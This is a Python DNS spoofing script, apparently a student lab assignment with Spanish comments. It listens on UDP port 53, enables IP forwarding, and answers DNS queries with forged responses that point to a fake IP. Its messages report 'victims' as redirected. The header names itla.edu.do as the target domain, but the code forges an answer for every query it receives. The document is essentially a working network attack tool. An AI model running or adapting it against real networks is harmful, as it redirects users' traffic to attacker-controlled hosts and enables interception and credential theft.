#!/usr/bin/env python3
# ============================================
# DNS Spoofing Attack Script
# Autor: Emely Ventura
# Matricula: 20241140
# Descripcion: Intercepta consultas DNS para
#              itla.edu.do y responde con IP
#              de servidor falso local
# Parametros: FAKE_IP, IFACE, puerto 53
# Requisitos: Python3, modulo socket
# ============================================

import socket
import os

FAKE_IP = "192.168.41.10"
IFACE   = "eth1"

def build_response(data, fake_ip):
    tid     = data[:2]
    flags   = b'\x81\x80'
    qdcount = b'\x00\x01'
    ancount = b'\x00\x01'
    nscount = b'\x00\x00'
    arcount = b'\x00\x00'
    header  = tid + flags + qdcount + ancount + nscount + arcount
    qsection = data[12:]
    end      = qsection.find(b'\x00')
    question = qsection[:end+5]
    answer   = b'\xc0\x0c'
    answer  += b'\x00\x01'
    answer  += b'\x00\x01'
    answer  += b'\x00\x00\x01\x2c'
    answer  += b'\x00\x04'
    answer  += socket.inet_aton(fake_ip)
    return header + question + answer

if __name__ == "__main__":
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 53))

    print("="*50)
    print("  DNS SPOOFING - Emely Ventura | 20241140")
    print("="*50)
    print(f"[*] Interfaz:   {IFACE}")
    print(f"[*] IP falsa:   {FAKE_IP}")
    print(f"[*] Dominio:    itla.edu.do")
    print(f"[*] Escuchando en puerto 53...\n")

    while True:
        data, addr = sock.recvfrom(512)
        print(f"[+] Consulta interceptada de: {addr[0]}")
        print(f"    Respondiendo con IP falsa: {FAKE_IP}")
        resp = build_response(data, FAKE_IP)
        sock.sendto(resp, addr)
        print(f"    [OK] Victima redirigida exitosamente")
